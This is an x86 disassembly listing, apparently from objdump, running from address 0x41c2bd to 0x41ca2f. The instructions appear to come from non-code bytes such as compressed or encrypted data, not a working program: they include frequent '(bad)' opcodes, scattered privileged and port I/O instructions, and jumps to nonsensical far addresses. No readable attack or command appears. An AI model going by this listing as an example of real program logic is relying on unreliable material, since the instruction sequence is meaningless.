  41c2bd:	loopne 0x41c298
  41c2bf:	pop    ebx
  41c2c0:	and    eax,0x8bc23dbe
  41c2c5:	add    edi,DWORD PTR [esi+0x7]
  41c2c8:	pop    edx
  41c2c9:	xor    esi,DWORD PTR [eax-0x76]
  41c2cc:	push   ebp
  41c2cd:	and    al,0x39
  41c2cf:	and    dh,dl
  41c2d1:	int3   
  41c2d2:	(bad)  
  41c2d3:	sub    eax,0xf43dd438
  41c2d8:	test   al,0x3d
  41c2da:	cmp    bh,BYTE PTR [ecx+0x6b]
  41c2dd:	sbb    dl,cl
  41c2df:	add    eax,0xbb397e30
  41c2e4:	gs in  eax,0xe
  41c2e7:	inc    edx
  41c2e8:	xchg   esi,eax
  41c2e9:	imul   edx,edx,0x50
  41c2ec:	sti    
  41c2ed:	fimul  DWORD PTR gs:[esi+0x12]
  41c2f1:	test   eax,0xf025c5a0
  41c2f6:	sub    al,0xbd
  41c2f8:	stos   BYTE PTR es:[edi],al
  41c2f9:	bound  eax,QWORD PTR [ebx+0x4b]
  41c2fc:	push   0xb79414e5
  41c301:	(bad)  
  41c302:	aam    0x30
  41c304:	cli    
  41c305:	pop    eax
  41c306:	test   eax,0x479023c3
  41c30b:	xchg   edx,eax
  41c30c:	sub    al,0x91
  41c30e:	rcl    bh,0xbb
  41c311:	scas   eax,DWORD PTR es:[edi]
  41c312:	lds    esp,FWORD PTR [ebp+0x74b0096d]
  41c318:	aas    
  41c319:	inc    esi
  41c31a:	dec    esp
  41c31b:	pop    edi
  41c31c:	call   0x786927fc
  41c321:	fimul  WORD PTR [edx]
  41c323:	sub    eax,0xa07fcc32
  41c328:	ret    
  41c329:	popa   
  41c32a:	scas   eax,DWORD PTR es:[edi]
  41c32b:	xchg   esi,eax
  41c32c:	lock inc ecx
  41c32e:	fwait
  41c32f:	inc    esp
  41c330:	sbb    cl,BYTE PTR [edi-0x92e5fea]
  41c336:	ss aam 0xef
  41c339:	loopne 0x41c3a2
  41c33b:	neg    ebx
  41c33d:	push   esi
  41c33e:	dec    edx
  41c33f:	lahf   
  41c340:	daa    
  41c341:	js     0x41c3b4
  41c343:	push   ecx
  41c344:	or     al,0xbd
  41c346:	nop
  41c347:	out    dx,al
  41c348:	or     al,0x5a
  41c34a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c34b:	jmp    0xbf86:0x2bc73b77
  41c352:	pop    ecx
  41c353:	sbb    bh,BYTE PTR [edx-0x6464566e]
  41c359:	icebp  
  41c35a:	dec    esp
  41c35b:	cmp    eax,0x1b1d71cb
  41c360:	mov    ch,0x22
  41c362:	xchg   DWORD PTR [ecx+0x29],edx
  41c365:	inc    eax
  41c366:	(bad)  [esi]
  41c368:	push   ecx
  41c369:	dec    eax
  41c36a:	inc    edi
  41c36b:	aam    0x77
  41c36d:	mov    fs,WORD PTR [ebp-0x5f7afae5]
  41c373:	push   0xffffff89
  41c375:	test   eax,0x913ded47
  41c37a:	cdq    
  41c37b:	stc    
  41c37c:	jb     0x41c309
  41c37e:	push   es
  41c37f:	mov    al,ds:0x3cc86a7c
  41c384:	cmc    
  41c385:	fsubr  DWORD PTR [esi]
  41c387:	fiadd  DWORD PTR [ebp+0x3390e145]
  41c38d:	inc    esp
  41c38e:	mov    bh,0x6d
  41c390:	clc    
  41c391:	xchg   esi,eax
  41c392:	cmp    BYTE PTR [ebx+eax*2-0x7c7a608b],cl
  41c399:	retf   0x6de7
  41c39c:	jb     0x41c3dd
  41c39e:	mov    BYTE PTR [ecx-0x40],al
  41c3a1:	fcmovb st,st(5)
  41c3a3:	lods   eax,DWORD PTR ds:[esi]
  41c3a4:	adc    ecx,DWORD PTR [eax*1-0x120e7549]
  41c3ab:	or     BYTE PTR [edi],bl
  41c3ad:	ror    DWORD PTR [eax],1
  41c3af:	je     0x41c40f
  41c3b1:	aaa    
  41c3b2:	mov    bl,0x17
  41c3b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3b5:	call   0xf98f2ad6
  41c3ba:	pop    ds
  41c3bb:	sub    DWORD PTR [esi],edi
  41c3bd:	in     eax,dx
  41c3be:	jne    0x41c430
  41c3c0:	mov    edi,edx
  41c3c2:	and    al,0xbe
  41c3c4:	icebp  
  41c3c5:	mov    edi,0x10920b34
  41c3ca:	ret    
  41c3cb:	jne    0x41c3d1
  41c3cd:	push   ss
  41c3ce:	pop    esi
  41c3cf:	fstp   DWORD PTR [edi+0x75]
  41c3d2:	dec    esi
  41c3d3:	pop    ds
  41c3d4:	bound  edx,QWORD PTR [eax+0x6a]
  41c3d7:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41c3d9:	dec    edi
  41c3da:	jp     0x41c415
  41c3dc:	das    
  41c3dd:	and    eax,0x46d28376
  41c3e2:	fld    QWORD PTR ds:0x2e1a6245
  41c3e8:	popf   
  41c3e9:	push   ecx
  41c3ea:	xchg   esp,eax
  41c3eb:	pop    eax
  41c3ec:	shl    DWORD PTR [edi],0xd5
  41c3ef:	mov    es,WORD PTR [ecx-0x34]
  41c3f2:	add    DWORD PTR [edx],ecx
  41c3f4:	repz lock mov ah,0xaa
  41c3f8:	inc    eax
  41c3f9:	push   ebx
  41c3fa:	push   esi
  41c3fb:	mov    ch,0x8c
  41c3fd:	mov    ebp,0x34fa2bc1
  41c402:	mov    cs,WORD PTR [eax-0x73]
  41c405:	into   
  41c406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c407:	lods   eax,DWORD PTR ds:[esi]
  41c408:	xor    al,0x69
  41c40a:	imul   ebp,esp,0xffffffe7
  41c40d:	add    eax,0xd3999cef
  41c412:	and    eax,0xf2e21b0d
  41c417:	pop    ds
  41c418:	or     al,0x70
  41c41a:	sbb    DWORD PTR [ecx-0x54cc4fe3],eax
  41c420:	cmp    al,0x1e
  41c422:	xchg   ecx,eax
  41c423:	push   ebx
  41c424:	inc    edi
  41c425:	cmp    ecx,DWORD PTR [ecx-0x67]
  41c428:	push   es
  41c429:	mov    esi,0xeebeef5c
  41c42e:	out    dx,al
  41c42f:	iret   
  41c430:	xchg   ecx,eax
  41c431:	mov    ebx,0xbc9ba945
  41c436:	jae    0x41c46c
  41c438:	sbb    esp,DWORD PTR [edx+0x0]
  41c43b:	push   ecx
  41c43c:	cld    
  41c43d:	pop    esp
  41c43e:	(bad)  
  41c43f:	aad    0x62
  41c441:	ss ins DWORD PTR es:[edi],dx
  41c443:	in     al,0x45
  41c445:	ror    DWORD PTR [eax+0x8fe27b9],1
  41c44b:	out    0x7e,al
  41c44d:	lock ins DWORD PTR es:[edi],dx
  41c44f:	shl    DWORD PTR [edi+0xa9fc82],cl
  41c455:	leave  
  41c456:	(bad)  
  41c458:	mov    al,ds:0xe5fddcc0
  41c45d:	inc    eax
  41c45e:	dec    ecx
  41c45f:	ja     0x41c4ac
  41c461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c462:	data16 sahf 
  41c464:	inc    esp
  41c465:	and    eax,0xe9779f13
  41c46a:	pushf  
  41c46b:	jecxz  0x41c472
  41c46d:	xchg   edi,esi
  41c46f:	js     0x41c4ea
  41c471:	push   eax
  41c472:	mov    ds:0x222da494,al
  41c477:	mov    esp,0xf0525875
  41c47c:	xchg   ecx,eax
  41c47d:	and    bh,BYTE PTR [ebx+ecx*1-0x3741631c]
  41c484:	mov    esp,0xc844854e
  41c489:	cld    
  41c48a:	nop
  41c48b:	aam    0x83
  41c48d:	fdivrp st(3),st
  41c48f:	(bad)  
  41c490:	out    0xcb,eax
  41c492:	adc    edx,DWORD PTR [ebx]
  41c494:	xchg   esp,eax
  41c495:	xchg   esp,eax
  41c496:	mov    bl,0x6
  41c498:	in     al,dx
  41c499:	adc    al,BYTE PTR [eax+0x235412ed]
  41c49f:	push   edi
  41c4a0:	or     al,0x9
  41c4a2:	cmp    ecx,DWORD PTR [ebx-0x7df6b4b7]
  41c4a8:	mov    ebx,0xa0e0570d
  41c4ad:	jp     0x41c43e
  41c4af:	pop    ds
  41c4b0:	and    BYTE PTR [esi],0x3b
  41c4b3:	inc    ecx
  41c4b4:	mov    ch,0x68
  41c4b6:	mov    BYTE PTR [ecx],al
  41c4b8:	addr16 pop edi
  41c4ba:	add    al,0x6b
  41c4bc:	push   esp
  41c4bd:	push   0x18a12d5d
  41c4c2:	inc    ebp
  41c4c3:	adc    bh,ch
  41c4c5:	sar    DWORD PTR [ecx+ebp*1-0x1b],1
  41c4c9:	pop    ecx
  41c4ca:	out    dx,al
  41c4cb:	retf   0xf3df
  41c4ce:	mov    eax,edi
  41c4d0:	xor    DWORD PTR [ebx-0x7a4b6da9],eax
  41c4d6:	call   0xf72:0xa33450de
  41c4dd:	adc    esp,ebx
  41c4df:	fidiv  WORD PTR ds:0xed6703b0
  41c4e5:	mov    ah,0x67
  41c4e7:	jmp    0xb2cbefe2
  41c4ec:	or     BYTE PTR [esi-0x10],ah
  41c4ef:	push   0xffffff98
  41c4f1:	jnp    0x41c4ea
  41c4f3:	xchg   edi,eax
  41c4f4:	pop    ebp
  41c4f5:	fwait
  41c4f6:	imul   ebp,DWORD PTR [edx+0x3c4f843f],0xffffffba
  41c4fd:	mov    sp,0xcd1
  41c501:	xor    DWORD PTR [eax-0x70],ecx
  41c504:	mov    BYTE PTR [ecx-0x6b],ah
  41c507:	push   es
  41c508:	sbb    edx,ecx
  41c50a:	ror    BYTE PTR [edi+ebx*4+0x6bb6ffc9],0xd5
  41c512:	repz (bad) [ebp+ebx*1+0x1115c7ba]
  41c51a:	sbb    al,0x49
  41c51c:	call   0xbeef7869
  41c521:	xor    al,0xe
  41c523:	loop   0x41c512
  41c525:	xchg   ecx,eax
  41c526:	push   ecx
  41c527:	mov    ecx,0xb2b0de70
  41c52c:	xor    al,BYTE PTR [ecx]
  41c52e:	sbb    eax,DWORD PTR [ebx]
  41c530:	sub    DWORD PTR [eax+0x13],edi
  41c533:	cmp    DWORD PTR [ebp-0x66411eb8],esp
  41c539:	fs mov ah,0xa3
  41c53c:	xchg   esp,eax
  41c53d:	rcl    BYTE PTR [edi-0x54],0xf1
  41c541:	add    DWORD PTR [ebp+0x48b9833f],edx
  41c547:	ffreep st(3)
  41c549:	adc    BYTE PTR [ebx+0x22895007],0xf7
  41c550:	and    al,0x7f
  41c552:	push   eax
  41c553:	inc    esi
  41c554:	arpl   dx,ax
  41c556:	repz dec edi
  41c558:	dec    edx
  41c559:	cmp    BYTE PTR [ebp-0x7d885a2c],0x83
  41c560:	xchg   BYTE PTR [ebx+edx*1-0x7d35f73],cl
  41c567:	push   ebp
  41c568:	xchg   edx,eax
  41c569:	mov    al,ds:0xca2fb0be
  41c56e:	out    dx,al
  41c56f:	push   eax
  41c570:	jo     0x41c57f
  41c572:	mov    ebp,0x31c48edf
  41c577:	daa    
  41c578:	or     DWORD PTR [ebx+0x121b2d56],ebx
  41c57e:	and    cl,BYTE PTR [ecx-0xc]
  41c581:	mov    ds:0x155d5401,al
  41c586:	mov    eax,ds:0x41cde258
  41c58b:	outs   dx,BYTE PTR ds:[esi]
  41c58c:	or     eax,0x388f4b3d
  41c591:	push   0x49
  41c593:	lods   eax,DWORD PTR ds:[esi]
  41c594:	push   edx
  41c595:	cli    
  41c596:	push   ebx
  41c597:	out    dx,eax
  41c598:	les    esp,FWORD PTR [edx]
  41c59a:	popf   
  41c59b:	into   
  41c59c:	jno    0x41c52a
  41c59e:	clc    
  41c59f:	cli    
  41c5a0:	mov    dl,0xf9
  41c5a2:	push   ebp
  41c5a3:	dec    DWORD PTR [ecx]
  41c5a5:	loope  0x41c59b
  41c5a7:	fcmovu st,st(2)
  41c5a9:	popa   
  41c5aa:	pop    es
  41c5ab:	mov    eax,edx
  41c5ad:	ficomp DWORD PTR [ecx-0x2b192b05]
  41c5b3:	xchg   edi,eax
  41c5b4:	div    BYTE PTR [eax]
  41c5b6:	ret    
  41c5b7:	inc    ebx
  41c5b8:	popa   
  41c5b9:	(bad)  
  41c5ba:	adc    ebx,DWORD PTR [eax+0x3a]
  41c5bd:	sub    eax,0x9f325836
  41c5c2:	clc    
  41c5c3:	in     al,0x92
  41c5c5:	jbe    0x41c5da
  41c5c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5c8:	ret    
  41c5c9:	push   ds
  41c5ca:	add    al,0x8b
  41c5cc:	xlat   BYTE PTR ds:[ebx]
  41c5cd:	jnp    0x41c615
  41c5cf:	test   dl,ah
  41c5d1:	movntps XMMWORD PTR [ebx],xmm0
  41c5d4:	pusha  
  41c5d5:	ds stos BYTE PTR es:[edi],al
  41c5d7:	xchg   edx,eax
  41c5d8:	mov    eax,0x7ce7fb13
  41c5dd:	dec    ebx
  41c5de:	cld    
  41c5df:	loope  0x41c5cf
  41c5e1:	jo     0x41c5ad
  41c5e3:	int3   
  41c5e4:	dec    esp
  41c5e5:	xor    BYTE PTR [ebx-0x5b6a6c6d],cl
  41c5eb:	fcmovnbe st,st(7)
  41c5ed:	retf   
  41c5ee:	stos   DWORD PTR es:[edi],eax
  41c5ef:	add    eax,0x9fbde1d9
  41c5f4:	and    BYTE PTR [ebx+0x55143234],bh
  41c5fa:	cmp    BYTE PTR [eax],0xe
  41c5fd:	cmp    ch,bh
  41c5ff:	mov    bp,0x17e3
  41c603:	bound  esp,QWORD PTR [ecx]
  41c605:	push   es
  41c606:	mov    bl,0x90
  41c608:	mov    al,0xcf
  41c60a:	mov    ebp,0x7cf20af2
  41c60f:	ror    ah,cl
  41c611:	inc    edx
  41c612:	mov    eax,DWORD PTR [ebx]
  41c614:	sbb    esp,edi
  41c616:	cli    
  41c617:	loopne 0x41c632
  41c619:	xchg   edx,eax
  41c61a:	lds    esp,FWORD PTR [ecx+0x41]
  41c61d:	outs   dx,BYTE PTR ds:[esi]
  41c61e:	ret    0xc620
  41c621:	add    esp,edx
  41c623:	iret   
  41c624:	mov    edi,0x758a4858
  41c629:	xchg   dh,al
  41c62b:	xchg   BYTE PTR [ecx+0x24e93b26],dh
  41c631:	ins    BYTE PTR es:[edi],dx
  41c632:	add    BYTE PTR [ecx+0x5c],bl
  41c635:	pop    eax
  41c636:	mov    bl,0x5e
  41c638:	fnstsw WORD PTR [esi-0x7d]
  41c63b:	xor    eax,0x42e0308b
  41c640:	test   ebp,esp
  41c642:	rcl    BYTE PTR [edi-0x5c731054],0x94
  41c649:	mov    al,0x12
  41c64b:	(bad)  
  41c64c:	and    eax,0xfce80afc
  41c651:	inc    ecx
  41c652:	dec    esp
  41c653:	or     edx,edx
  41c655:	out    dx,al
  41c656:	or     al,0x26
  41c658:	pop    ecx
  41c659:	fwait
  41c65a:	call   0xa2f8:0xa45bb95d
  41c661:	scas   eax,DWORD PTR es:[edi]
  41c662:	mov    edi,ss
  41c664:	std    
  41c665:	sbb    ebx,DWORD PTR [esi-0x609de961]
  41c66b:	fs ret 
  41c66d:	mov    ds:0x61d73483,al
  41c672:	out    dx,al
  41c673:	mov    dl,0xba
  41c675:	sub    edx,esp
  41c677:	mov    BYTE PTR [ebx+0x1f1621fe],cl
  41c67d:	ds enter 0x3b8b,0xa0
  41c682:	loope  0x41c6ad
  41c684:	xchg   BYTE PTR [eax-0x1c81325d],bl
  41c68a:	sbb    eax,0xffb393b4
  41c68f:	(bad)  
  41c690:	adc    al,0xe6
  41c692:	xchg   edi,eax
  41c693:	xchg   edx,eax
  41c694:	clc    
  41c695:	jp     0x41c63f
  41c697:	pop    esp
  41c698:	mov    edi,0xb214bbf2
  41c69d:	push   ecx
  41c69e:	in     eax,0x9e
  41c6a0:	cmp    dh,dh
  41c6a2:	add    edi,DWORD PTR [edx+0x6c]
  41c6a5:	repnz inc edx
  41c6a7:	or     eax,DWORD PTR [edx-0x61]
  41c6aa:	adc    BYTE PTR [ebp-0x6c84e499],dl
  41c6b0:	jp     0x41c6b5
  41c6b2:	je     0x41c6a3
  41c6b4:	add    BYTE PTR gs:[ebx-0x739dcb79],dh
  41c6bb:	mov    esi,DWORD PTR [eax-0x7ca7c4d]
  41c6c1:	cmp    DWORD PTR [edi],edi
  41c6c3:	icebp  
  41c6c4:	and    BYTE PTR [ebp+0x165e6f9d],cl
  41c6ca:	hlt    
  41c6cb:	push   ecx
  41c6cc:	jne    0x41c6cf
  41c6ce:	test   DWORD PTR [ecx-0x7aba3927],edi
  41c6d4:	shl    BYTE PTR [esi],1
  41c6d6:	aas    
  41c6d7:	adc    DWORD PTR [eax-0x2c],esi
  41c6da:	popa   
  41c6db:	dec    esi
  41c6dc:	mov    ?,WORD PTR [ecx+0x5c7c793b]
  41c6e2:	retf   0x1832
  41c6e5:	mov    WORD PTR [eax+ebx*8],ss
  41c6e8:	or     al,0xb1
  41c6ea:	mov    eax,0xa9af6bab
  41c6ef:	hlt    
  41c6f0:	push   es
  41c6f1:	mov    dl,0x12
  41c6f3:	repz (bad) 
  41c6f5:	adc    eax,ecx
  41c6f7:	test   eax,0x4801e3b
  41c6fc:	mov    ch,0x6d
  41c6fe:	adc    al,0xaf
  41c700:	push   0xe8a1b56b
  41c705:	outs   dx,BYTE PTR ds:[esi]
  41c706:	out    dx,eax
  41c707:	lds    ebp,FWORD PTR [eiz*1-0x33cd4943]
  41c70e:	popf   
  41c70f:	lods   al,BYTE PTR ds:[esi]
  41c710:	retf   0xaaf7
  41c713:	ja     0x41c6dd
  41c715:	pop    ss
  41c716:	(bad)  
  41c717:	jmp    0xc0cd:0xa7c34d6a
  41c71e:	outs   dx,DWORD PTR ds:[esi]
  41c71f:	xchg   bl,dl
  41c721:	loope  0x41c70f
  41c723:	ins    BYTE PTR es:[edi],dx
  41c724:	mov    edi,0xfcf4d88
  41c729:	test   BYTE PTR [esi+eiz*2+0xab46be],ch
  41c730:	cmp    ebp,DWORD PTR [ebx]
  41c732:	or     DWORD PTR [eax+esi*4+0x1c2fb341],eax
  41c739:	push   ecx
  41c73a:	jle    0x41c799
  41c73c:	jecxz  0x41c6de
  41c73e:	pusha  
  41c73f:	push   eax
  41c740:	dec    esi
  41c741:	ds mov edx,0xff05bdb2
  41c747:	adc    ebx,DWORD PTR [ebx-0x4a]
  41c74a:	jbe    0x41c79f
  41c74c:	mov    ds,WORD PTR [eax]
  41c74e:	outs   dx,BYTE PTR ds:[esi]
  41c74f:	jmp    0xbc46:0x3c0c7423
  41c756:	sbb    al,0x94
  41c758:	xchg   edx,eax
  41c759:	mov    ah,0x92
  41c75b:	jp     0x41c758
  41c75d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c75e:	jg     0x41c77c
  41c760:	mov    ah,0x68
  41c762:	call   0x15e3:0xcacf3887
  41c769:	ret    
  41c76a:	mov    ebx,0xd7e0b8ad
  41c76f:	sbb    eax,0x2f05fd57
  41c774:	fist   DWORD PTR [ecx-0x12]
  41c777:	xchg   esp,eax
  41c778:	in     al,0xab
  41c77a:	aam    0x46
  41c77c:	push   ebp
  41c77d:	pushf  
  41c77e:	or     eax,0x1aa5240c
  41c783:	push   esi
  41c784:	pop    edi
  41c785:	push   ss
  41c786:	or     DWORD PTR [esi-0x6ba99a96],0xcdf6dca9
  41c790:	(bad)
  41c793:	push   eax
  41c794:	xchg   DWORD PTR [ebx+ebx*2+0x502f0b41],eax
  41c79b:	call   0x7279:0xe9f1702c
  41c7a2:	lahf   
  41c7a3:	pop    ecx
  41c7a4:	retf   
  41c7a5:	subps  xmm6,XMMWORD PTR [edi]
  41c7a8:	cmp    edx,DWORD PTR [ebx]
  41c7aa:	lds    edx,FWORD PTR [esi-0x5c198101]
  41c7b0:	mov    WORD PTR [bp+si-0x3],fs
  41c7b4:	mov    ecx,0xbcf8b89c
  41c7b9:	push   es
  41c7ba:	fcmovne st,st(6)
  41c7bc:	ins    DWORD PTR es:[edi],dx
  41c7bd:	dec    edi
  41c7be:	dec    ecx
  41c7bf:	xor    ecx,esi
  41c7c1:	outs   dx,DWORD PTR ds:[esi]
  41c7c2:	xchg   ebx,eax
  41c7c3:	call   0x9af6:0xa26ea530
  41c7ca:	xor    esp,edi
  41c7cc:	sbb    eax,0x60f9a2b9
  41c7d1:	sbb    BYTE PTR [edx-0x58],0x6e
  41c7d5:	dec    ecx
  41c7d6:	or     ecx,ebx
  41c7d8:	and    dh,BYTE PTR ds:0x8c26eb99
  41c7de:	stc    
  41c7df:	xchg   esi,eax
  41c7e0:	inc    esi
  41c7e1:	mov    ebx,0x92c05002
  41c7e6:	jnp    0x41c7a2
  41c7e8:	pop    edi
  41c7e9:	inc    eax
  41c7ea:	bound  eax,QWORD PTR [edi+0x7a]
  41c7ed:	or     BYTE PTR [edx+0x25],dl
  41c7f0:	sbb    eax,0x56f6e98c
  41c7f5:	ins    BYTE PTR es:[edi],dx
  41c7f6:	xor    bl,ah
  41c7f8:	shl    ebx,1
  41c7fa:	mov    ch,0x67
  41c7fc:	mov    esi,DWORD PTR [esi-0x33]
  41c7ff:	dec    ebp
  41c800:	(bad)  
  41c801:	mov    esi,0x1ec85aa2
  41c806:	jnp    0x41c866
  41c808:	add    eax,0x977612b0
  41c80d:	mov    dh,0x80
  41c80f:	fsubr  DWORD PTR [edi-0x58]
  41c812:	adc    BYTE PTR [eax],ah
  41c814:	mov    bl,0x16
  41c816:	aas    
  41c817:	cdq    
  41c818:	push   eax
  41c819:	or     DWORD PTR [ecx+0x5b],edx
  41c81c:	aaa    
  41c81d:	in     al,dx
  41c81e:	mov    eax,0x90d0a018
  41c823:	and    BYTE PTR [ebp-0x31],bh
  41c826:	sub    eax,0x5337c754
  41c82b:	jne    0x41c802
  41c82d:	out    0x54,eax
  41c82f:	jle    0x41c840
  41c831:	test   al,0x9
  41c833:	cmp    DWORD PTR [edi+0x25],0x30b5e43b
  41c83a:	jecxz  0x41c882
  41c83c:	mov    dh,0x6d
  41c83e:	int    0x91
  41c840:	and    al,0xb
  41c842:	pop    ebx
  41c843:	jnp    0x41c7f9
  41c845:	xlat   BYTE PTR ds:[ebx]
  41c846:	pop    edi
  41c847:	mov    esi,?
  41c849:	adc    bl,BYTE PTR [edx+0x3baac19c]
  41c84f:	fucomip st,st(4)
  41c851:	jp     0x41c8bc
  41c853:	pop    edi
  41c854:	jae    0x41c820
  41c856:	xor    DWORD PTR ds:0x9e345b81,esp
  41c85c:	cmp    al,0xb3
  41c85e:	loop   0x41c86e
  41c860:	(bad)  
  41c861:	jmp    0x41c874
  41c863:	mov    cl,0x5d
  41c865:	out    dx,al
  41c866:	add    ebx,ecx
  41c868:	lods   al,BYTE PTR ds:[esi]
  41c869:	fdivr  DWORD PTR fs:[edi]
  41c86c:	lds    esi,FWORD PTR [edi-0x64]
  41c86f:	mov    al,0x42
  41c871:	nop
  41c872:	mov    cl,0x75
  41c874:	xchg   ebp,eax
  41c875:	loope  0x41c80c
  41c877:	cmp    BYTE PTR ds:0xb145a856,ah
  41c87d:	stos   BYTE PTR es:[edi],al
  41c87e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c87f:	inc    esi
  41c880:	or     al,0x88
  41c882:	xor    al,0x62
  41c884:	dec    edi
  41c885:	pop    esp
  41c886:	stos   BYTE PTR es:[edi],al
  41c887:	loop   0x41c8e6
  41c889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c88a:	jmp    0x1729:0xf4ee64ad
  41c891:	mov    al,0x89
  41c893:	xchg   DWORD PTR [edx-0x7b],edi
  41c896:	inc    ecx
  41c897:	add    bh,BYTE PTR [ebx+0x305259e5]
  41c89d:	pusha  
  41c89e:	icebp  
  41c89f:	cli    
  41c8a0:	jmp    0x41c844
  41c8a2:	adc    eax,0xe770c312
  41c8a7:	jb     0x41c927
  41c8a9:	push   esi
  41c8aa:	sub    BYTE PTR [ebx-0x76e8b793],al
  41c8b0:	and    al,0xfb
  41c8b2:	cmc    
  41c8b3:	fprem1 
  41c8b5:	cli    
  41c8b6:	sub    DWORD PTR [ecx],esi
  41c8b8:	inc    edi
  41c8b9:	mov    ds:0x544d6bcb,eax
  41c8be:	ja     0x41c8d6
  41c8c0:	test   eax,0x350772e7
  41c8c5:	jmp    0x41c91b
  41c8c7:	shr    DWORD PTR [ebx-0x1f],1
  41c8ca:	xor    ebp,DWORD PTR [esi]
  41c8cc:	(bad)  
  41c8cd:	aas    
  41c8ce:	hlt    
  41c8cf:	adc    DWORD PTR [eax+0x39],edx
  41c8d2:	repnz outs dx,DWORD PTR ds:[esi]
  41c8d4:	sbb    cl,BYTE PTR [ebp-0x1]
  41c8d7:	arpl   WORD PTR [esi+0x3c8e1f17],dx
  41c8dd:	and    al,cl
  41c8df:	rol    DWORD PTR [esi],0x13
  41c8e2:	iret   
  41c8e3:	mov    BYTE PTR [edx+0x6c3e58a3],cl
  41c8e9:	call   0x5fe6b0f0
  41c8ee:	adc    DWORD PTR [edx+0x74efcf75],eax
  41c8f4:	or     eax,0x962c0e76
  41c8f9:	xchg   edi,eax
  41c8fa:	pop    esp
  41c8fb:	dec    BYTE PTR [edi+0x59f8a752]
  41c901:	fs out dx,eax
  41c903:	retf   
  41c904:	mov    esp,0x34246a91
  41c909:	mov    ah,bh
  41c90b:	jbe    0x41c944
  41c90d:	fucomip st,st(1)
  41c90f:	inc    ebp
  41c910:	dec    edi
  41c911:	sub    ah,BYTE PTR [edx]
  41c913:	jge    0x41c95c
  41c915:	pop    ds
  41c916:	enter  0x52e9,0xb5
  41c91a:	adc    cl,bh
  41c91c:	xor    al,0xa
  41c91e:	inc    esp
  41c91f:	sahf   
  41c920:	push   cs
  41c921:	inc    ebp
  41c922:	js     0x41c8ce
  41c924:	lahf   
  41c925:	mov    edi,0x9dbf1d28
  41c92a:	jmp    0x41c918
  41c92c:	and    esi,ebp
  41c92e:	in     al,dx
  41c92f:	bound  esp,QWORD PTR [esi-0x42]
  41c932:	cdq    
  41c933:	xchg   ebp,eax
  41c934:	mov    ebx,gs
  41c936:	stc    
  41c937:	sub    BYTE PTR [edi-0x30],0xa7
  41c93b:	sub    cl,dh
  41c93d:	loope  0x41c97d
  41c93f:	cdq    
  41c940:	pushf  
  41c941:	adc    ebp,DWORD PTR [ecx-0x58]
  41c944:	(bad)  
  41c945:	sbb    DWORD PTR [ebp-0x2d76ccec],edx
  41c94b:	push   esi
  41c94c:	rcl    ch,0x22
  41c94f:	(bad)  
  41c950:	enter  0x515e,0x2f
  41c954:	mov    dh,BYTE PTR ds:0xdb5b507c
  41c95a:	pop    ebp
  41c95b:	xor    eax,0x13a2f3eb
  41c960:	mov    ds:0xd079cb3,eax
  41c965:	dec    esi
  41c966:	mov    ebp,0x8647b903
  41c96b:	imul   esi,DWORD PTR [esi-0x74],0x850145e3
  41c972:	or     BYTE PTR [ebx-0x21],0x30
  41c976:	aad    0x2e
  41c978:	outs   dx,BYTE PTR ds:[esi]
  41c979:	or     DWORD PTR [ebp-0x1245d2ad],0x3c210d04
  41c983:	jnp    0x41c993
  41c985:	xchg   esi,eax
  41c986:	test   BYTE PTR ds:0x608807ff,0xae
  41c98d:	retf   0xa817
  41c990:	inc    esi
  41c991:	scas   al,BYTE PTR es:[edi]
  41c992:	pop    edx
  41c993:	inc    esi
  41c994:	mov    al,ds:0x11e63ad1
  41c999:	cmc    
  41c99a:	adc    ch,BYTE PTR [ecx+eiz*2-0x2d]
  41c99e:	inc    ebx
  41c99f:	mov    cl,0xd7
  41c9a1:	andps  xmm2,XMMWORD PTR [edx-0x2f]
  41c9a5:	(bad)  
  41c9a6:	sti    
  41c9a7:	dec    esi
  41c9a8:	mov    DWORD PTR [edx-0x60],esp
  41c9ab:	xor    cl,BYTE PTR [esi]
  41c9ad:	fnstenv [ebx+0x49]
  41c9b0:	out    dx,eax
  41c9b1:	sbb    al,0x67
  41c9b3:	lods   eax,DWORD PTR ds:[esi]
  41c9b4:	xor    eax,DWORD PTR [edi-0x7c]
  41c9b7:	outs   dx,BYTE PTR ds:[esi]
  41c9b8:	xchg   DWORD PTR [edi-0x42],ebx
  41c9bb:	cmp    esp,DWORD PTR [ecx]
  41c9bd:	test   DWORD PTR [ebp-0x76],esp
  41c9c0:	lea    ebp,[edi+0x50]
  41c9c3:	dec    esi
  41c9c4:	fcomip st,st(6)
  41c9c6:	mov    al,0xbd
  41c9c8:	mov    cl,0x9f
  41c9ca:	shl    DWORD PTR [eax+0x38d2852f],cl
  41c9d0:	popa   
  41c9d1:	aad    0x2e
  41c9d3:	in     eax,0x40
  41c9d5:	clc    
  41c9d6:	jmp    0x41c97e
  41c9d8:	push   0x291022fa
  41c9dd:	test   eax,0x81b1fd8f
  41c9e2:	mov    ecx,0x9f018572
  41c9e7:	mov    eax,ds:0x3af40d84
  41c9ec:	fwait
  41c9ed:	adc    ecx,DWORD PTR [ecx]
  41c9ef:	pop    ds
  41c9f0:	fnstenv [ebx-0x54]
  41c9f3:	push   0xfffffff1
  41c9f5:	jae    0x41ca47
  41c9f7:	mov    ah,BYTE PTR [eax+0x20]
  41c9fa:	test   eax,0x63447013
  41c9ff:	(bad)  
  41ca00:	iret   
  41ca01:	adc    DWORD PTR [ebp+0x7b],ecx
  41ca04:	add    eax,0xd142250a
  41ca09:	cmp    al,0xdc
  41ca0b:	add    edi,DWORD PTR [edx-0x2b]
  41ca0e:	adc    al,BYTE PTR [ecx+0x53]
  41ca11:	fwait
  41ca12:	pop    ss
  41ca13:	ins    DWORD PTR es:[edi],dx
  41ca14:	sub    dh,BYTE PTR [eax-0x64ddc91b]
  41ca1a:	sbb    al,0x4e
  41ca1c:	cmp    BYTE PTR [eax-0x623b9c3d],ah
  41ca22:	das    
  41ca23:	jmp    0x41ca2b
  41ca25:	call   0xf27f35e6
  41ca2a:	mov    ah,BYTE PTR [ebp+edi*1-0x58]
  41ca2e:	pop    eax
  41ca2f:	xchg   esi,eax
